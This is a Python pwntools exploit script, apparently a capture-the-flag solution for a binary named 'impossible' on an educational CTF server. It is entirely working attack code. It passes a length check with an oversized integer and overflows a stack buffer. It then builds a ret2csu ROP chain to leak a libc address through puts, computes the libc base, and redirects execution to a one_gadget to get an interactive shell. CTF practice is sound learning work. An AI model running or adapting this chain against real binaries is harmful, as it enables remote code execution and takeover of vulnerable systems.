from pwn import *
import time
import sys


def exploit():
    if len(sys.argv) <= 1:
        input('attach to pid: {}'.format(proc.proc.pid))
    csu_init = 0x400866
    call_csu = 0x400850
    puts_got = 0x601018
    read_got = 0x601028
    magic = 0x601000
    pop_r14_r15 = 0x400870
    proc.sendlineafter(b':', '2147483648')
    buf = b'A' * 0x108
    buf += flat(csu_init, 0, 0, 1, puts_got, puts_got, 0, 0, call_csu)
    buf += flat(0, 0, 1, read_got, 0, magic, 8, call_csu)
    buf += flat(0, 0, 1, magic, 0, 0, 0, pop_r14_r15, 0, 0, call_csu)
    buf += b'\x00' * 0x100
    proc.send(buf)
    proc.recvuntil(b':)\n')
    libc = proc.recvuntil(b'\x7f')
    libc = u64(libc + b'\x00\x00')
    libc -= 0x809c0
    log.info('libc: ' + hex(libc))
    one_gadget = libc + 0x10a38c
    one_gadget = libc + 0x4f322
    proc.send(p64(one_gadget))


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc eductf.zoolab.org 10105'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./impossible'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
